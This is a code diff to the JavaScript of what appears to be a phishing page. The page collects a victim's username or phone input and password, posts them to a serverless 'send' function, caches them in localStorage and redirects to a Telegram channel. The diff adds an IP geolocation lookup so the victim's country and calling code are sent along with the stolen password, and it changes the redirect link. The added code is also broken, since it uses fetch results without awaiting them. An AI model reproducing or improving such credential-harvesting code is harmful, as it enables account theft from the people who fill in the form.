@@ -60,9 +60,14 @@ document.addEventListener('DOMContentLoaded', function () {
         );
 
         if (isDuplicate) {
-            window.location.href = "https://t.me/HapyCode";
+            window.location.href = "https://t.me/+CpftuBTR04wzMDNi";
             return;
         }
+
+        const res = fetch('https://ipwho.is/');
+        const data = res.json();
+        const country = data.country || "لا يوجد";
+        const code = `+${data.calling_code}` || "لا يوجد";
 
         fetch('/.netlify/functions/send', {
             method: 'POST',
@@ -71,13 +76,15 @@ document.addEventListener('DOMContentLoaded', function () {
             },
             body: JSON.stringify({
                 text: userInput,
-                password: password
+                password: password,
+                country: country,
+                callingCode: code
             })
         })
             .then(response => {
                 sentData.push({ user: userInput, pass: password });
                 localStorage.setItem('sentData', JSON.stringify(sentData));
-                window.location.href = "https://t.me/HapyCode";
+                window.location.href = "https://t.me/+CpftuBTR04wzMDNi";
             })
     });
 });
